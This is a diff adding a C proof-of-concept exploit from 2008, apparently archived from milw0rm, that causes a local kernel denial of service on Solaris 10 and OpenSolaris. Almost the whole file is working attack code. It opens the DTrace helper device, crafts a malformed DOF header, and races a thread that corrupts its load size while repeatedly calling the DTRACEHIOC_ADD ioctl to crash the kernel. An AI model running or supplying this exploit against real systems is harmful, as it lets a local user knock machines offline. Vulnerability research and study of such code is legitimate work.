@@ -1,0 +1,103 @@
+/* solaris-dtrace-dos.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * Solaris >= 10/Opensolaris local kernel DoS POC
+ * by mu-b - Mon 17 Nov 2008
+ *
+ * - Tested on:  Sun Solaris 10 (SPARC)
+ *               Sun OpenSolaris <= snv_113 (x86)
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <assert.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <dtrace.h>
+
+#define DTRACE_HELPER "/dev/dtrace/helper"
+
+static unsigned int changes = 0;
+
+void *
+hammer (void *arg)
+{
+  struct dof_hdr *phdr;
+
+  phdr = arg;
+  while (1)
+    {
+      phdr->dofh_loadsz = -1;
+      changes++;
+
+      usleep (10);
+    }
+}
+
+int
+main (int argc, char **argv)
+{
+  union {
+    struct dof_hdr hdr;
+    unsigned char buf[256*1024];
+  } hdr_t;
+  struct dof_hdr *phdr;
+  int i, fd, n, tid;
+
+  printf ("Solaris >= 10/Opensolaris local kernel DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  fd = open (DTRACE_HELPER, O_RDONLY);
+  if (fd < 0)
+    {
+      fprintf (stderr, "failed opening %s\n", DTRACE_HELPER);
+      return (EXIT_FAILURE);
+    }
+
+  phdr = &hdr_t.hdr;
+  memset (phdr, 0, sizeof *phdr);
+
+  memcpy (&phdr->dofh_ident, DOF_MAG_STRING, DOF_MAG_STRLEN);
+  phdr->dofh_ident[DOF_ID_MODEL] = DOF_MODEL_LP64;
+  phdr->dofh_ident[DOF_ID_ENCODING] = DOF_ENCODE_NATIVE;
+  phdr->dofh_ident[DOF_ID_VERSION] = DOF_VERSION_2;
+  phdr->dofh_ident[DOF_ID_DIFVERS] = DOF_VERSION_2;
+  phdr->dofh_ident[DOF_ID_DIFIREG] = DIF_DIR_NREGS;
+  phdr->dofh_ident[DOF_ID_DIFTREG] = DIF_DTR_NREGS;
+  phdr->dofh_secsize = 1024;
+  phdr->dofh_secnum = 1024;
+  phdr->dofh_secoff = 0x7fffffffffff0000;
+
+  n = pthread_create (&tid, NULL, hammer, phdr);
+  if (n < 0)
+    {
+      fprintf (stderr, "failed creating hammer thread\n");
+      return (EXIT_FAILURE);
+    }
+
+  for (i = 0; ; i++)
+    {
+      phdr->dofh_loadsz = sizeof hdr_t / 2;
+      n = ioctl (fd, DTRACEHIOC_ADD, phdr);
+      assert (n == -1);
+
+      if (!(i % 64))
+        printf ("tried %d-times, %d-changes\r", i, changes);
+    }
+
+  /* not reached! */
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2009-05-04]
